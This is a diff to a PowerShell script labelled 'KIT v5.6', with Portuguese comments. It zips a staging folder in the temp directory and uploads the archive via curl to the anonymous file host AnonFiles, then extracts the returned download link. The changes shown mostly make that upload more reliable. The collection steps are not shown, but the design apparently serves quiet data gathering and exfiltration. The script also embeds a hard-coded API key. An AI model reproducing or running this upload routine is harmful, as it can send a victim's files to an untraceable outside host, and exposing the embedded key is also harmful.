@@ -1,4 +1,4 @@
-# ---------- KIT v5.5 – COMPLETO, sem corrupção, upload garantido ----------
+# ---------- KIT v5.6 – COMPLETO, sem corrupção, upload GARANTIDO ----------
 $ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -83,10 +83,11 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::CreateFromDirectory($kit,$zip,'Optimal',$false)
 Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length bytes)"
 
-# 10) Upload – URL garantida + escape para cmd
+# 10) Upload – GARANTINDO URL + escape para cmd
 Write-Log "[UP] Enviando para AnonFiles..."
 Write-Log "[UP] URL usada: $upUrl"
 try {
+    # --form com @file e type explícito; aspas duplas escapadas pro cmd
     $reply = cmd /c "curl.exe -s -X POST -H `\"Content-Type: multipart/form-data`\" -F `\"file=@$zip;type=application/zip`\" $upUrl"
     Write-Log "[UP] Resposta bruta: $reply"
     if ($reply -match '"full":"([^"]+)"') {
